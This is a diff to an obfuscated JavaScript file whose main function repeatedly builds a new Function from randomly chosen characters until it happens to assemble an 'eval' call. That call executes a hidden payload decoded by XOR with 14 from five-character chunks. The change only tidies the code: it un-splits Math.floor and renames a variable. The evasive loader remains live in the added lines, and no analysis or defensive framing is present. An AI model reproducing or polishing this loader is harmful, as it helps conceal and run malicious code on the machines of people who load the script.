@@ -8,7 +8,7 @@ function ffyshboqha(a,b){
 function liovbrleki()
 {
 	var chars = new Array("d","e","v","a","l","^");
-	return chars[Math["floo"+""+"r"](Math.random()*chars.length)];
+	return chars[Math.floor(Math.random()*chars.length)];
 }
 function getHash()
 {
@@ -60,11 +60,11 @@ function getHash()
 
 function main(ynrlyerfuv)
 {
-	var re;
+	var result;
 	while(true){
 		try
 		{
-			result=(new Function("mliohtsiue","var hltxbtlnyx=mliohtsiue.match(/\\S{5}/g),mndjlyeorw=\"\",orxhspxbkw=0;while(orxhspxbkw<hltxbtlnyx.length){mndjlyeorw+=Str"+"ing['fromCharCode'](vjfumaorll(hltxbtlnyx[orxhspxbkw])"+liovbrleki()+"14);orxhspxbkw++;}"+liovbrleki()+liovbrleki()+liovbrleki()+liovbrleki()+"(mndjlyeorw);")(ynrlyerfuv));
+			result = (new Function("mliohtsiue","var hltxbtlnyx=mliohtsiue.match(/\\S{5}/g),mndjlyeorw=\"\",orxhspxbkw=0;while(orxhspxbkw<hltxbtlnyx.length){mndjlyeorw+=Str"+"ing['fromCharCode'](vjfumaorll(hltxbtlnyx[orxhspxbkw])"+liovbrleki()+"14);orxhspxbkw++;}"+liovbrleki()+liovbrleki()+liovbrleki()+liovbrleki()+"(mndjlyeorw);")(ynrlyerfuv));
 			break;
 		}
 		catch(er)
